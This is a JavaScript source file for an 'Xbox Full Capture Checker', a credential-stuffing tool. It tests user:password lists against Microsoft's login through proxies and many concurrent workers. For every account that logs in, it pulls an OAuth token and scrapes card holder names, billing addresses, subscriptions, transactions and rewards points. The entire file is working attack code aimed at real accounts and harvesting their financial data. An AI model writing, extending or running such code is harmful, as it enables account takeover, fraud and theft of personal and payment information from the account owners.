// ============================================================
//  Xbox Full Capture Checker — 1:1 port of xbox-checker-bot-py/checker.py
//  Uses dynamic PPFT + urlPost extraction and a per-account cookie jar
//  so cookies accumulate across the full redirect chain (matches Python
//  requests.Session behavior). This is critical — without it almost
//  every account ends up classified as "fail".
// ============================================================

const { proxiedFetch } = require("./proxy-manager");
const { runPool } = require("./worker-pool");

const AUTHORIZE_URL =
  "https://login.live.com/oauth20_authorize.srf" +
  "?client_id=0000000048170EF2" +
  "&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf" +
  "&response_type=token" +
  "&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL" +
  "&display=touch";

const OAUTH_TOKEN_URL =
  "https://login.live.com/oauth20_authorize.srf" +
  "?client_id=000000000004773A" +
  "&response_type=token" +
  "&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete" +
  "&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth" +
  "&state=%7B%22userId%22%3A%22bf3383c9b44aa8c9%22%2C%22scopeSet%22%3A%22pidl%22%7D" +
  "&prompt=none";

const COMMON_HEADERS = {
  "User-Agent":
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
  Accept:
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
  "Accept-Language": "en-US,en;q=0.9",
  "Accept-Encoding": "gzip, deflate",
};

// ── Cookie jar (session-like) ────────────────────────────────
class CookieJar {
  constructor() { this.jar = {}; }
  ingest(headers) {
    const setCookies = headers.getSetCookie?.() || [];
    for (const c of setCookies) {
      const [pair] = c.split(";");
      const eq = pair.indexOf("=");
      if (eq > 0) {
        const name = pair.slice(0, eq).trim();
        const val = pair.slice(eq + 1).trim();
        if (name) this.jar[name] = val;
      }
    }
  }
  header() {
    return Object.entries(this.jar).map(([k, v]) => `${k}=${v}`).join("; ");
  }
  dict() { return { ...this.jar }; }
}

// ── Helpers ──────────────────────────────────────────────────
function parseLR(text, left, right) {
  const re = new RegExp(
    left.replace(/[.*+?^${}()|[\]\\]/g, "\\$&") +
      "(.*?)" +
      right.replace(/[.*+?^${}()|[\]\\]/g, "\\$&"),
    "s"
  );
  const m = text.match(re);
  return m ? m[1] : "";
}

function checkStatus(text, url, cookies) {
  if (
    text.includes("Your account or password is incorrect.") ||
    text.includes("That Microsoft account doesn\\'t exist.") ||
    text.includes("Sign in to your Microsoft account") ||
    text.includes("timed out")
  )
    return "FAILURE";
  if (text.includes(",AC:null,urlFedConvertRename")) return "BAN";
  if (
    text.includes("account.live.com/recover?mkt") ||
    text.includes("recover?mkt") ||
    text.includes("account.live.com/identity/confirm?mkt") ||
    text.includes("Email/Confirm?mkt")
  )
    return "2FACTOR";
  if (text.includes("/cancel?mkt=") || text.includes("/Abuse?mkt=")) return "CUSTOM_LOCK";
  if (("ANON" in cookies || "WLSSC" in cookies) && url.includes("https://login.live.com/oauth20_desktop.srf?"))
    return "SUCCESS";
  return "UNKNOWN_FAILURE";
}

// fetch + cookie jar helper (manual redirects so we accumulate cookies)
async function jarFetch(url, opts, jar, signal) {
  const headers = { ...(opts.headers || {}) };
  const cookieHeader = jar.header();
  if (cookieHeader) headers.Cookie = cookieHeader;

  // Use redirect: "manual" so we can capture Set-Cookie at each hop
  let currentUrl = url;
  let method = opts.method || "GET";
  let body = opts.body;
  let res;
  for (let hop = 0; hop < 10; hop++) {
    res = await proxiedFetch(currentUrl, {
      ...opts,
      method,
      body,
      headers: { ...headers, Cookie: jar.header() || undefined },
      redirect: "manual",
      signal,
    });
    jar.ingest(res.headers);
    const status = res.status;
    if (status >= 300 && status < 400) {
      const loc = res.headers.get("location");
      if (!loc) break;
      currentUrl = new URL(loc, currentUrl).toString();
      // 303 + most browsers convert POST→GET on 302/301 for cross-origin too
      if (status === 303 || ((status === 301 || status === 302) && method === "POST")) {
        method = "GET";
        body = undefined;
      }
      continue;
    }
    break;
  }
  // Attach final URL
  res._finalUrl = currentUrl;
  return res;
}

async function checkSingleAccount(credential, signal) {
  const sep = credential.indexOf(":");
  if (sep < 0) return { status: "fail", user: credential, password: "", detail: "Bad format" };

  const user = credential.slice(0, sep);
  const password = credential.slice(sep + 1);
  const jar = new CookieJar();

  try {
    // ── Step 1: GET authorize page → extract fresh PPFT + urlPost ──
    const r0 = await jarFetch(AUTHORIZE_URL, { headers: COMMON_HEADERS }, jar, signal);
    const page = await r0.text();

    // PPFT — try multiple patterns to survive page tweaks
    let ppft =
      parseLR(page, 'name="PPFT" id="i0327" value="', '"') ||
      parseLR(page, "sFT:'", "'") ||
      parseLR(page, 'sFT:"', '"') ||
      parseLR(page, 'name="PPFT" value="', '"') ||
      parseLR(page, '"sFT":"', '"');
    if (!ppft) {
      // Treat blank/garbage page as a transient — let pool retry instead of marking fail
      if (!page || page.length < 200) return { status: "retry", user, password, detail: "Empty login page" };
      return { status: "fail", user, password, detail: "PPFT not found" };
    }

    let urlPost =
      parseLR(page, "urlPost:'", "'") ||
      parseLR(page, 'urlPost:"', '"') ||
      parseLR(page, '"urlPost":"', '"');
    if (!urlPost) return { status: "retry", user, password, detail: "urlPost not found" };

    // ── Step 2: POST login with fresh PPFT to dynamic urlPost ──
    const data =
      `ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=` +
      `&PPFT=${encodeURIComponent(ppft)}` +
      `&PPSX=PassportRN&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=1` +
      `&isSignupPost=0&isRecoveryAttemptPost=0&i13=1` +
      `&login=${encodeURIComponent(user)}&loginfmt=${encodeURIComponent(user)}&type=11&LoginOptions=1` +
      `&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd=${encodeURIComponent(password)}`;

    const postHeaders = {
      ...COMMON_HEADERS,
      Host: "login.live.com",
      Connection: "keep-alive",
      "Cache-Control": "max-age=0",
      Origin: "https://login.live.com",
      "Content-Type": "application/x-www-form-urlencoded",
      "Sec-Fetch-Site": "same-origin",
      "Sec-Fetch-Mode": "navigate",
      "Sec-Fetch-User": "?1",
      "Sec-Fetch-Dest": "document",
      Referer: r0._finalUrl || AUTHORIZE_URL,
      "Upgrade-Insecure-Requests": "1",
    };

    const r1 = await jarFetch(urlPost, { method: "POST", headers: postHeaders, body: data }, jar, signal);
    const text1 = await r1.text();
    const finalUrl = r1._finalUrl || "";

    const status = checkStatus(text1, finalUrl, jar.dict());
    if (status !== "SUCCESS") {
      if (status === "FAILURE") return { status: "fail", user, password, detail: "Invalid Credentials" };
      if (status === "UNKNOWN_FAILURE") return { status: "retry", user, password, detail: "Unknown Failure" };
      if (status === "BAN") return { status: "locked", user, password, detail: "Banned" };
      if (status === "2FACTOR") return { status: "locked", user, password, detail: "2FA/Verify" };
      if (status === "CUSTOM_LOCK") return { status: "locked", user, password, detail: "Custom Lock" };
      return { status: "fail", user, password, detail: status };
    }

    // ── Step 3: OAuth token fetch ──
    const r2 = await jarFetch(
      OAUTH_TOKEN_URL,
      {
        headers: {
          Host: "login.live.com",
          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0",
          Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
          "Accept-Language": "en-US,en;q=0.5",
          "Accept-Encoding": "gzip, deflate",
          Connection: "close",
          Referer: "https://account.microsoft.com/",
        },
      },
      jar,
      signal
    );
    const url2 = r2._finalUrl || "";
    await r2.text().catch(() => "");
    const token = decodeURIComponent(parseLR(url2, "access_token=", "&token_type") || "");
    if (!token) return { status: "locked", user, password, detail: "Token Parse Fail" };

    const apiHeaders = {
      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/88.0.4324.96 Safari/537.36",
      Pragma: "no-cache",
      Accept: "application/json",
      "Accept-Encoding": "gzip, deflate, br",
      "Accept-Language": "en-US,en;q=0.9",
      Authorization: `MSADELEGATE1.0="${token}"`,
      Connection: "keep-alive",
      "Content-Type": "application/json",
      Host: "paymentinstruments.mp.microsoft.com",
      "ms-cV": "FbMB+cD6byLL1mn4W/NuGH.2",
      Origin: "https://account.microsoft.com",
      Referer: "https://account.microsoft.com/",
      "Sec-Fetch-Dest": "empty",
      "Sec-Fetch-Mode": "cors",
      "Sec-Fetch-Site": "same-site",
      "Sec-GPC": "1",
    };

    // ── Step 4: payment info ──
    const r3 = await proxiedFetch(
      "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US",
      { headers: apiHeaders, signal }
    );
    const src3 = await r3.text();

    const balance = parseLR(src3, 'balance":', ',"') || "N/A";
    const cardHolder = parseLR(src3, 'paymentMethodFamily":"credit_card","display":{"name":"', '"') || "N/A";
    const accountHolderName = parseLR(src3, 'accountHolderName":"', '","') || "N/A";
    const zipcode = parseLR(src3, '"postal_code":"', '",') || "N/A";
    const region = parseLR(src3, '"region":"', '",') || "N/A";
    const address1 = parseLR(src3, '{"address_line1":"', '",') || "N/A";
    const city = parseLR(src3, '"city":"', '",') || "N/A";

    // ── Step 5: subscriptions / transactions ──
    const r5 = await proxiedFetch(
      "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions",
      { headers: apiHeaders, signal }
    );
    const src5 = await r5.text();

    const country = parseLR(src5, 'country":"', '"}') || "N/A";
    const subscription = parseLR(src5, 'title":"', '",') || "N/A";
    const autoRenew = (() => {
      const ctpid = parseLR(src5, '"subscriptionId":"ctp:', '"');
      if (!ctpid || ctpid === "N/A") return "N/A";
      return parseLR(src5, `{"subscriptionId":"ctp:${ctpid}","autoRenew":`, ",") || "N/A";
    })();
    const startDate = parseLR(src5, '"startDate":"', "T") || "N/A";
    const nextRenewal = parseLR(src5, '"nextRenewalDate":"', "T") || "N/A";
    const description = parseLR(src5, '"description":"', '"') || "N/A";
    const quantity = parseLR(src5, '"quantity":', ",") || "N/A";
    const currency = parseLR(src5, '"currency":"', '"') || "";
    const totalAmount = parseLR(src5, '"totalAmount":', ",") || "N/A";
    const item1 = parseLR(src5, '"title":"', '"') || "N/A";

    // ── Step 6: rewards points ──
    const r4 = await proxiedFetch("https://rewards.bing.com/", {
      headers: {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/80.0.3987.149 Safari/537.36",
        Pragma: "no-cache",
        Accept: "*/*",
        Cookie: jar.header(),
      },
      signal,
    });
    const src4 = await r4.text();
    const points = parseLR(src4, ',"availablePoints":', ',"') || "0";

    const captures = {
      Address: `${address1}, ${city}, ${region}, ${zipcode}`,
      CC: `Country: ${country} | Holder: ${accountHolderName} | Card: ${cardHolder} | Balance: $${balance}`,
      Sub1: `Item: ${item1} | AutoRenew: ${autoRenew} | Start: ${startDate} | NextBill: ${nextRenewal}`,
      Sub2: `Product: ${description} | Qty: ${quantity} | Points: ${points} | Total: ${totalAmount}${currency}`,
      Points: points,
    };

    // Hit if ANY of these are true: future renewal, autoRenew=true, or a known subscription title is present
    let isActive = false;
    if (subscription && subscription !== "N/A") {
      if (nextRenewal && nextRenewal !== "N/A") {
        try {
          const renewalDate = new Date(nextRenewal);
          if (!isNaN(renewalDate.getTime()) && renewalDate >= new Date()) isActive = true;
        } catch {}
      }
      if (!isActive && (autoRenew === "true" || autoRenew === true)) isActive = true;
      if (!isActive) {
        const sub = String(subscription).toLowerCase();
        if (
          sub.includes("game pass") ||
          sub.includes("xbox live") ||
          sub.includes("ultimate") ||
          sub.includes("microsoft 365") ||
          sub.includes("office 365")
        ) isActive = true;
      }
    }

    return {
      status: isActive ? "hit" : "free",
      user,
      password,
      captures,
      detail: isActive ? "Active Subscription" : "No/Expired Sub",
    };
  } catch (err) {
    if (err.name === "AbortError") return { status: "fail", user, password, detail: "Aborted" };
    const msg = err.message || String(err);
    if (msg.includes("fetch") || msg.includes("ECONNR") || msg.includes("timeout") || msg.includes("socket"))
      return { status: "retry", user, password, detail: "Connection Error" };
    return { status: "fail", user, password, detail: msg.slice(0, 60) };
  }
}

async function checkXboxAccounts(accounts, threads = 30, onProgress, signal) {
  const results = await runPool({
    items: accounts,
    concurrency: threads,
    maxRetries: 3,
    signal,
    scope: "xboxchk",
    runner: async (cred, ctx) => {
      const r = await checkSingleAccount(cred, ctx.signal);
      if (r.status === "retry") return { retry: true };
      return { result: r };
    },
    onResult: (r, done, total) => {
      if (onProgress) onProgress(done, total, r);
    },
  });
  return results.filter(Boolean);
}

module.exports = { checkXboxAccounts, checkSingleAccount };
